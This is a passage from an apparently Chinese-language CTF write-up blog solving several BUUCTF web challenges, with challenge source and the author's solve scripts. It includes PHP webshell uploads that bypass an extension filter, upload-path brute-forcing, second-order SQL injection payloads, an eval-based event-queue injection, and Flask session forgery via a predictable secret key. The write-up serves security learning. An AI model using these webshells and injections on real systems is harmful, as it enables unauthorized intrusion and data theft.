str(r.json())</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p>這個匿名函數是真的痲</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = create_function(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-comment">//创建一个$MY的匿名函数，函数的作用是输出flag</span><br><span class="hljs-comment">//匿名函数其实是有真正的名字，为%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)</span><br><span class="hljs-variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这里创建一个匿名函数，然后通过GET传过来的func_name来访问自定义函数</p><p>关键点是上面注释中提到的匿名函数的名字，于是有脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> email <span class="hljs-keyword">import</span> contentmanager<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> requests<br>base_url=<span class="hljs-string">&#x27;http://65f4fcbe-6a17-43ba-bac6-cf8c7eaa10c4.node4.buuoj.cn:81/?func_name=%00lambda_1&#x27;</span><br>r=requests.get(url=base_url)<br>content=r.text<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> content:<br>    <span class="hljs-built_in">print</span>(content)<br></code></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>差点就解出来了…差一步知识积累</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        show_source(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>        <br>        <span class="hljs-keyword">if</span> (strstr(strtolower(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$upload</span> = <span class="hljs-keyword">new</span> \Think\Upload();<span class="hljs-comment">// 实例化上传类</span><br>        <span class="hljs-variable">$upload</span>-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// 设置附件上传大小</span><br>        <span class="hljs-variable">$upload</span>-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);<span class="hljs-comment">// 设置附件上传类型</span><br>        <span class="hljs-variable">$upload</span>-&gt;rootPath = <span class="hljs-string">&#x27;./Public/Uploads/&#x27;</span>;<span class="hljs-comment">// 设置附件上传目录</span><br>        <span class="hljs-variable">$upload</span>-&gt;savePath = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// 设置附件上传子目录</span><br>        <span class="hljs-variable">$info</span> = <span class="hljs-variable">$upload</span>-&gt;upload() ;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$info</span>) &#123;<span class="hljs-comment">// 上传错误提示错误信息</span><br>          <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$upload</span>-&gt;getError());<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// 上传成功 获取上传文件信息</span><br>          <span class="hljs-variable">$url</span> = __ROOT__.substr(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我自己没搞出，学习一下思想</p><p>链接：<a href="https://blog.csdn.net/SopRomeo/article/details/106472619?spm=1001.2101.3001.6650.5&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5.pc_relevant_default&amp;utm_relevant_index=7">https://blog.csdn.net/SopRomeo/article/details/106472619?spm=1001.2101.3001.6650.5&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-5.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-5.pc_relevant_default&amp;utm_relevant_index=7</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-string">&#x27;&#x27;&#x27;方法一</span><br><span class="hljs-string">这里是利用的  upload() 函数不传参时为多文件上传，整个 $_FILES 数组的文件都会上传保存。题目中只限制了 $_FILES[file] 的上传后缀，也只给出 $_FILES[file] 上传后的路径，那我们上传多文件就可以绕过 php 后缀限制</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/index.php/home/index/upload&#x27;</span><br>s = requests.Session()<br><br>file1 = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>,)&#125;<br>file2 = &#123;<span class="hljs-string">&quot;file[]&quot;</span>:(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php @eval($_POST[penson]);&quot;</span>)&#125; <span class="hljs-comment">#批量上传用[]</span><br>r = s.post(url,files=file1)<br><span class="hljs-built_in">print</span>(r.text)<br>r = s.post(url,files=file2)<br><span class="hljs-built_in">print</span>(r.text)<br>r = s.post(url,files=file1)<br><span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;爆破&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">dir</span> =<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>                <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>                    url = <span class="hljs-string">&#x27;http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/Public/Uploads/2020-06-01/5ed4adac&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,j,k,x,y)<br>                    <span class="hljs-built_in">print</span>(url)<br>                    r = requests.get(url)<br>                    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                        <span class="hljs-built_in">print</span>(url)<br>                        <span class="hljs-keyword">break</span><br><span class="hljs-string">&#x27;&#x27;&#x27;方法二&#x27;&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9b96c9f8-7b74-491a-94fd-f8063d1b8a29.node3.buuoj.cn/index.php/home/index/upload/&quot;</span><br>s = requests.Session()<br>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&quot;shell.&lt;&gt;php&quot;</span>, <span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url, files=files)<br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>base_url=<span class="hljs-string">&#x27;http://a2fd7fb8-e84c-4273-87a0-a1ef07279c78.node4.buuoj.cn:81/?action=&#x27;</span><br>reg=base_url+<span class="hljs-string">&#x27;reg&#x27;</span><br>log=base_url+<span class="hljs-string">&#x27;login&#x27;</span><br>index=base_url+<span class="hljs-string">&#x27;index&#x27;</span><br>s=requests.session()<br>regdata=&#123;<br>   <span class="hljs-comment"># &quot;username&quot;:&quot;1&#x27; union select database() #&quot;,</span><br>   <span class="hljs-comment"># &quot;username&quot;:&quot;1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;&quot;,</span><br>  <span class="hljs-comment">#  &quot;username&quot;:&quot;1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;,</span><br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;1&#x27; union select flag from flag #&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;test&quot;</span><br>    <br>&#125;<br><span class="hljs-comment"># querydata=&#123;</span><br><br><span class="hljs-comment">#     &quot;info&quot;:&quot;test&quot;</span><br><span class="hljs-comment"># &#125;</span><br>req=s.post(reg,data=regdata)<br>time.sleep(<span class="hljs-number">1</span>)<br>res=s.post(log,data=regdata)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>读取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_flag_function</span>(<span class="hljs-params">args</span>):</span><br>    flag = args[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag_handler</span>(<span class="hljs-params">args</span>):</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;num_items&#x27;</span>] &gt;= <span class="hljs-number">5</span>:<br>        <span class="hljs-comment"># show_flag_function has been disabled, no worries</span><br>        trigger_event(<span class="hljs-string">&#x27;func:show_flag;&#x27;</span> + FLAG())<br>    trigger_event(<span class="hljs-string">&#x27;action:view;index&#x27;</span>)<br>    ...<br></code></pre></td></tr></table></figure><p>这个 get_flag_handler() 函数可以帮助我们获取Flag，需要满足 <code>session[&#39;num_items&#39;] &gt;= 5</code></p><p>然后回去看 trigger_event这个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trigger_event</span>(<span class="hljs-params">event</span>):</span><br>    session[<span class="hljs-string">&#x27;log&#x27;</span>].append(event)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(session[<span class="hljs-string">&#x27;log&#x27;</span>]) &gt; <span class="hljs-number">5</span>:<br>        session[<span class="hljs-string">&#x27;log&#x27;</span>] = session[<span class="hljs-string">&#x27;log&#x27;</span>][-<span class="hljs-number">5</span>:]  <span class="hljs-comment">#取最后五个</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(event) == <span class="hljs-built_in">type</span>([]):<br>        request.event_queue += event<br>    <span class="hljs-keyword">else</span>:<br>        request.event_queue.append(event)<br><br>...<br></code></pre></td></tr></table></figure><p>这里直接吧传入的参数放到了   session[‘log’] 里面，所以FLAG()在session里</p><p>然后看这个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_event_loop</span>():</span><br>    valid_event_chars = <span class="hljs-built_in">set</span>(<br>        <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)<br>    resp = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(request.event_queue) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br>        event = request.event_queue[<span class="hljs-number">0</span>]<br>        request.event_queue = request.event_queue[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> event.startswith((<span class="hljs-string">&#x27;action:&#x27;</span>, <span class="hljs-string">&#x27;func:&#x27;</span>)):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> event:<br>            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> valid_event_chars:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            is_action = event[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;a&#x27;</span><br>            action = get_mid_str(event, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>)<br>            args = get_mid_str(event, action+<span class="hljs-string">&#x27;;&#x27;</span>).split(<span class="hljs-string">&#x27;#&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                event_handler = <span class="hljs-built_in">eval</span>(<br>                    action + (<span class="hljs-string">&#x27;_handler&#x27;</span> <span class="hljs-keyword">if</span> is_action <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;_function&#x27;</span>))<br>                ret_val = event_handler(args)<br>            <span class="hljs-keyword">except</span> RollBackException:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = <span class="hljs-string">&#x27;&#x27;</span><br>                resp += <span class="hljs-string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span><br>                resp += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>                session[<span class="hljs-string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="hljs-string">&#x27;num_items&#x27;</span>]<br>                session[<span class="hljs-string">&#x27;points&#x27;</span>] = request.prev_session[<span class="hljs-string">&#x27;points&#x27;</span>]<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> Exception, e:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = <span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-comment"># resp += str(e) # only for debugging</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> ret_val <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = ret_val<br>                <span class="hljs-keyword">else</span>:<br>                    resp += ret_val<br>    <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> resp == <span class="hljs-string">&#x27;&#x27;</span>:<br>        resp = (<span class="hljs-string">&#x27;404 NOT FOUND&#x27;</span>, <span class="hljs-number">404</span>)<br>    session.modified = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> resp<br></code></pre></td></tr></table></figure><p>这里存在一个eval函数 可以帮助执行命令，题目只能买三个钻石，而实际解题需要五个及以上，我们发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buy_handler</span>(<span class="hljs-params">args</span>):</span><br>    num_items = <span class="hljs-built_in">int</span>(args[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> num_items &lt;= <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="hljs-built_in">format</span>(args[<span class="hljs-number">0</span>])<br>    session[<span class="hljs-string">&#x27;num_items&#x27;</span>] += num_items<br>    trigger_event([<span class="hljs-string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        num_items), <span class="hljs-string">&#x27;action:view;index&#x27;</span>])<br></code></pre></td></tr></table></figure><p>这里可以直接加 num_items 那，上面的execute_event_loop如果可以执行到buy_handler就可以凭空加钻石了</p><p>也就是 eval(trigger_event)</p><p>然后有</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">?action:trigger_event%<span class="hljs-number">23</span>;action:buy;<span class="hljs-number">2%</span><span class="hljs-number">23</span>action:buy;<span class="hljs-number">3%</span><span class="hljs-number">23</span>action:get_flag;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>拿到的session进行base64decode即可</p><h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p><code>http://1770b21a-5676-453c-815a-4899c1f0f10e.node4.buuoj.cn:81/read?url=app.py</code></p><p>读取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding:utf-8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flag</span>():</span><br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">True</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br><br><br></code></pre></td></tr></table></figure><p>有 Secret 有 username可以考虑 Flask 伪造session</p><p>uuid.getnode() 说明种子是 mac地址的十进制表示形式</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022222440.png" alt="image-20220202222241378"></p><p><code>5a:ab:36:90:92:94</code> 获取地址</p><p>求种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>random.seed(<span class="hljs-number">0x0242ae0295f6</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>))<br><span class="hljs-comment">#82.56599527038603</span><br></code></pre></td></tr></table></figure><p>解密session &amp; 伪造session</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 